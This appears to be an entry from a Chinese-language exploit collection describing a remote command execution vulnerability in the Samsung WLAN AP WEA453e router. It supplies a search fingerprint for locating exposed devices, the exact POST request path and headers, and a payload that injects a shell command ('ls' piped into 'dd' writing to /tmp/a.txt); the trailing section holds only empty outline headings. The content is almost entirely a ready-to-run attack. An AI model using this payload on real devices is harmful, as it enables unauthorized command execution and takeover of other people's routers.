# 三星路由器WLANAP远程命令执行漏洞

- **系统**：三星路由器WLANAP　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="Samsung WLAN AP"`
- **请求**：`POST /(download)/tmp/a.txt HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 36`

**请求体 / payload**
```
command1=shell:ls  dd of=/tmp/a.txt
```

**其他**
- 三星路由器WLAN AP 远程命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 三星 WLAN AP WEA453e路由器